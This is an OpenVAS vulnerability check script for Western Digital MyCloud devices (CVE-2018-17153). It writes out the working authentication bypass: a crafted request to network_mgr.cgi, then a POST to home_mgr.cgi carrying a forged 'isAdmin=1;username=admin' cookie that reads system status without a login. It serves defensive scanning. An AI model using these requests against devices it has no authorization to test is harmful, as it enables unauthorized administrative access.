###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wd_mycloud_auth_bypass.nasl 12561 2018-11-28 13:48:33Z cfischer $
#
# WD MyCloud Products Authentication Bypass and Remote Command Injection Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE_PREFIX = "cpe:/o:wdc";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108305");
  script_version("$Revision: 12561 $");
  script_cve_id("CVE-2018-17153");
  script_bugtraq_id(105359);
  script_tag(name:"last_modification", value:"$Date: 2018-11-28 14:48:33 +0100 (Wed, 28 Nov 2018) $");
  script_tag(name:"creation_date", value:"2017-11-30 08:00:00 +0100 (Thu, 30 Nov 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("WD MyCloud Products Authentication Bypass and Remote Command Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wd_mycloud_consolidation.nasl");
  script_mandatory_keys("wd-mycloud/http/detected");

  script_xref(name:"URL", value:"https://support.wdc.com/downloads.aspx?lang=en#firmware");
  script_xref(name:"URL", value:"https://support.wdc.com/knowledgebase/answer.aspx?ID=25952");
  script_xref(name:"URL", value:"https://blog.westerndigital.com/western-digital-my-cloud-update/");
  script_xref(name:"URL", value:"https://www.exploitee.rs/index.php/Western_Digital_MyCloud");
  script_xref(name:"URL", value:"https://securify.nl/nl/advisory/SFY20180102/authentication-bypass-vulnerability-in-western-digital-my-cloud-allows-escalation-to-admin-privileges.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/105359");

  script_tag(name:"summary", value:"Western Digital MyCloud Products are prone to an authentication bypass and
  multiple remote command injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET and HTTP POST request and check the response.");

  script_tag(name:"impact", value:"Successful exploit allows an attacker to execute arbitrary commands with
  root privileges in context of the affected application.");

  script_tag(name:"solution", value:"The vendor has released firmware updates. Please see the references
  for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www", first_cpe_only:TRUE ) )
  exit( 0 );

CPE = infos["cpe"];
if( ! CPE || "my_cloud" >!< CPE )
  exit( 0 );

port = infos["port"];

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

# The first request logs us in without even setting an cookie
# nb: It will return a 404 but it is still working as expected...
url = dir + "/cgi-bin/network_mgr.cgi?cmd=cgi_get_ipv6&flag=1";
req = http_get( port:port, item:url );
res = http_keepalive_send_recv( port:port, data:req );

# now we're able to access the system information without a previous login as long as the
# "admin" user is a valid / existing account.
# nb: This file / cgi is available on e.g a MyCloud Mirror 2.11.x or MyCloud EX4100 2.30.x
url2 = dir + "/cgi-bin/home_mgr.cgi";
data = "cmd=2";
cookie = "isAdmin=1;username=admin";

req2 = http_post_req( port:port, url:url2, data:data,
                      accept_header:"application/xml, text/xml, */*; q=0.01",
                      add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie ) );
res2 = http_keepalive_send_recv( port:port, data:req2, bodyonly:FALSE );

# nb: The device will response with a "HTTP/1.1 404 not found" if access to the home_mgr.cgi was denied.
if( res2 =~ "^HTTP/1\.[01] 200" && "<config>" >< res2 && res2 =~ "<(board_temperature|fan|hd_status|disk|raid|raidmode)>.*</(board_temperature|fan|hd_status|disk|raid|raidmode)>" ) {

  info['"HTTP POST" body'] = data;
  info['Cookie'] = cookie;
  info['URL'] = report_vuln_url( port:port, url:url2, url_only:TRUE );

  report  = 'By requesting the URL:\n\n';
  report += report_vuln_url( port:port, url:url, url_only:TRUE );
  report += '\n\nit was possible to bypass the authententication of the remote device.\n\n';
  report += 'With a follow-up request:\n\n';
  report += text_format_table( array:info ) + '\n';
  report += 'it was possible to access the system status without a previous valid login.';
  report += '\n\nResult: ' + res2;

  expert_info  = 'Request 1:\n'+ req + '\nResponse 1 (404 HTTP status code is expected):\n' + res;
  expert_info += 'Request 2:\n'+ req2 + '\n\nResponse 2:\n' + res2;
  security_message( port:port, data:report, expert_info:expert_info );
  exit( 0 );
}

exit( 99 );
